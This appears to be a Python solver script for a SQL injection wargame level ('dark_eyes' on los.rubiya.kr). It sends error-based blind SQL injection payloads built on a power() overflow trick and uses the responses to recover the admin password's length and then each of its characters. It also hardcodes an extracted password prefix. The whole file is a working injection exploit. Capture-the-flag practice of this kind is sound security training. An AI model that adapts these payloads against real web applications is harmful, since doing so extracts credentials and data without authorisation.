import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"

no_error_text = "<hr>query : <strong>"

pw_len = None
prefix = ""


def find_char(prefix):
    for c in digits_and_lower_case_letters:
        pw_query = f"power((pw like '{prefix + c}%')*3,999)"
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' or id='admin' and {pw_query} -- -"))
        if not res.startswith(no_error_text):
            print("Found prefix", prefix + c)
            return prefix + c
    print("did not find char")


pw_len = 8
prefix = "5a2f5d3c"

if pw_len is None:
    for i in range(40):
        pw_query = f"power((length(pw)={i})*3,999)"
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' or id='admin' and {pw_query} -- -"))
        if not res.startswith(no_error_text):
            print("Found pw length:", i)
            pw_len = i
            break
    assert pw_len

while len(prefix) < pw_len:
    prefix = find_char(prefix)
    assert prefix

res = make_request(chall_url, f"?pw={prefix}")
check_clear(res)
